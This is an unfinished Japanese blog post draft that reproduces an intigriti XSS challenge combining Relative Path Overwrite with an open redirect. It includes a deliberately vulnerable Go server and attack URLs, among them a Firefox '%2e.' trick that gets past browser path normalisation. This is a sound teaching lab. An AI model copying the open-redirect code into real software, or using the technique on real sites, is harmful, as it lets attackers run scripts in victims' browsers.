+++
title = "RPOとOpenRedirectを用いたXSS"
date = "2021-07-21"
tags = [
    "security",
]
draft = true
+++

## RPOとは

Gereth heysが提唱

PRSSIとも呼ばれており、当初はCSSのみに焦点を当てた脆弱性でした

以下の記事で詳細を確認できます。

(TODO あの人が書いた記事のリンクを貼る)

## RPOとOpenRedirectを組み合わせたXSS

この脆弱性の理解のため、今回はintigritiのXSS Challengeで出題された問題の再現を行います。

この問題の詳細は以下の動画で確認できます。

TOOD youtube URL

上記の動画では、`http://vulnerable-server//example.com/..`にアクセスを行い、相対パスで読み込んでいるリソースの起点を`http://vulnerable-server//example.com`とすることで、任意のスクリプトの実行を行なっています。

`http://vulnerable-server//example.com/..`へのアクセスは正規化されたパスのコンテンツが返されるサーバーの仕様により、`http://vulnerable-server/`にアクセスした時と同じコンテンツが返却されます。

`http://vulnerable-server/`では、以下の様に相対パスでのスクリプトの読み込みを行なっているため、`http://vulnerable-server//example.com/script.js`からスクリプトが読み込まれます。

```html
<script src=script.js> </script> <!-- => http://vulnerable-server//example.com/script.js-->
```

`http://vulnerable-server//example.com/script.js`へのアクセスは、リダイレクトの機能が動作するため、実際には`http://example.com/script.js`から読み込まれます。

攻撃者は`example.com`の部分を好きなドメインに書き換えてアクセスすることで、好きなドメインからスクリプトを読み込むことが可能になります。

## 実装してみる

今回実装する脆弱なWebサーバーは、以下の機能を有しています。
- `//<ホスト名>`というようなアクセスでリダイレクトが可能
  - ex. `http://vulnerable-server//example.com`
- 正規化されたパスのコンテンツが返却される
  - ex. `http://example.com/first/..` => `http://example.com/`
- 相対パスでスクリプトの読み込みが行われている
  - ex. `<script src=script.js></script>`

Webサーバーの実装は以下の通りです。
```go
package main

import (
	"net/http"
	"log"
	"path"
	"fmt"
)

type VulnerableHandler map[string]http.Handler
func (v VulnerableHandler) ServeHTTP(w http.ResponseWriter,r *http.Request){
	// Serve HTTP
	p := path.Clean(r.URL.Path)
	if h, ok := v[p]; ok {
		log.Printf("serve: %s\n", p)
		h.ServeHTTP(w, r)
		return
	}

	// OpenRedirect
	if len(r.URL.Path) > 1 && r.URL.Path[0] == '/' && r.URL.Path[1] == '/' {
		redirectTo := fmt.Sprintf("https://%s", r.URL.Path[2:])
		w.Header().Set("Location", redirectTo)
		w.WriteHeader(302)
		log.Printf("redirect: %s\n", redirectTo)
		return
	}

	// return 404
	http.Error(w, "404", http.StatusNotFound)
}

func index(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(`
		<p>index page</p>
		<script src="script.js"></script>
	`))
}

func main() {
	mux := http.NewServeMux()
	mux.Handle("/", VulnerableHandler{
		"/": http.HandlerFunc(index),
	})

	handler := VulnerableHandler{
		"/": http.HandlerFunc(index),
	}
	http.ListenAndServe(":8000", handler)
}
```

GitHubのリンクはこちらです。 (TODO GitHubリンク)

## 再現

実装したサーバーを用いて、XSSを再現させます。

まずChromeで`http://localhost:8000//example.com/..`にアクセスしますが、ここで問題があります。

以下のスクリーンショットの様に、Chromeでは`http://localhost:8000//example.com/..`にアクセスした場合、ブラウザによって`http://localhost:8000`へのアクセスへ勝手に変更されてしまいます。

TODO スクリーンショット

この挙動は、FireFoxはSafariでも同様です。

これでは、相対パスの起点を`http://localhost:8000//example.com`にすることが出来ません。

しかし、FireFoxでは`http://localhost:8000//example.com/%2e.`と言う様なアクセスを行うことで、ブラウザの正規化を回避してアクセスが可能になります。

FireFoxで`http://localhost:8000//example.com/%2e.`にアクセスすることで、以下の様に`http://example.com/script.js`からファイルを読み込んでおり、攻撃が成功したことがわかります。

## まとめ

今回の例では、非常に限定的
